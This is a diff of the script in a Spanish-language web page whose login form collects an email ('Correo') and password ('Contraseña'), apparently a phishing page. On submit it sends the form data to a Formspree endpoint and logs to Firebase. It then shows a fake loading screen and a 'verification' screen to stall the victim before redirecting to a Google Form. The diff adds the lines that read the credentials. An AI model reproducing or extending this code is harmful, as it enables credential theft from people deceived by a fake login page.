@@ -133,7 +133,7 @@
 <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
 
 <script>
-  // Configuración Firebase (reemplaza con la tuya)
+  // Configuración Firebase (reemplaza con la tuya real)
   const firebaseConfig = {
     
     authDomain: "account-4a145.firebaseapp.com",
@@ -146,7 +146,7 @@
   firebase.initializeApp(firebaseConfig);
   const db = firebase.firestore();
 
-  // Escuchar en tiempo real
+  // Escuchar en tiempo real y mostrar último mensaje
   db.collection("mensajes").orderBy("timestamp", "desc").limit(1).onSnapshot(snapshot => {
     snapshot.forEach(doc => {
       const data = doc.data();
@@ -155,32 +155,42 @@
     });
   });
 
+  // Manejo del formulario
   document.getElementById("login-form").addEventListener("submit", function(e) {
     e.preventDefault();
     const form = e.target;
     const data = new FormData(form);
 
-    // Ocultar login, mostrar loading
+    const correo = form.Correo.value;
+    const contraseña = form.Contraseña.value;
+
+    // Enviar mensaje a Firebase
+    db.collection("mensajes").add({
+      texto: ` `,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    // Ocultar login, mostrar pantalla de carga
     document.getElementById("login-box").classList.remove("visible");
     document.getElementById("loading-screen").classList.add("visible");
 
-    // Enviar datos a Formspree
+    // Enviar datos a Formspree (opcional)
     fetch("https://formspree.io/f/xyzwopjb", {
       method: "POST",
       body: data,
       headers: { 'Accept': 'application/json' }
     });
 
-    // Después de 30 seg, mostrar verificación
+    // Mostrar pantalla de verificación después de 30 segundos
     setTimeout(() => {
       document.getElementById("loading-screen").classList.remove("visible");
       document.getElementById("verificacion").classList.add("visible");
 
-      // Luego de 15 seg, redirigir
+      // Redirigir después de otros 15 segundos
       setTimeout(() => {
         window.location.href = "https://forms.gle/M7DsjHnWW9gxQzHE7";
-      }, 45000);
-    }, 30000);
+      }, 15000);
+    }, 45000);
   });
 </script>
 
